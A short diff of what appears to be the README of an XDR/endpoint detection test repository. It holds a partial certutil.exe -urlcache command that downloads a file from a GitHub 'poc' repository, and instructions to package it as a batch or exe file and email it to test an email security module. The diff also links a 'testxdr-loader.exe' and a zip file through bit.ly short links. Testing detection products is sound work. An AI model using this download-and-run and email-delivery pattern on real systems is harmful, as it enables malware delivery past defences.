@@ -27,9 +27,9 @@ certutil.exe -urlcache -f https://raw.githubusercontent.com/chackco/poc/master/t
 save above command as batch/ convert to exe and send using email
 after open email > save file and run batch/exe to test email module
 
-https://raw.githubusercontent.com/chackco/poc/master/testxdr-loader.exe
+https://raw.githubusercontent.com/chackco/poc/master/testxdr-loader.exe  >> https://bit.ly/t-xdr-2
 
-https://raw.githubusercontent.com/chackco/poc/master/vaccine_az.txt.zip
+https://raw.githubusercontent.com/chackco/poc/master/vaccine_az.txt.zip >> https://bit.ly/t-xdr-3
 
-https://bit.ly/t-xdr-2
+
 
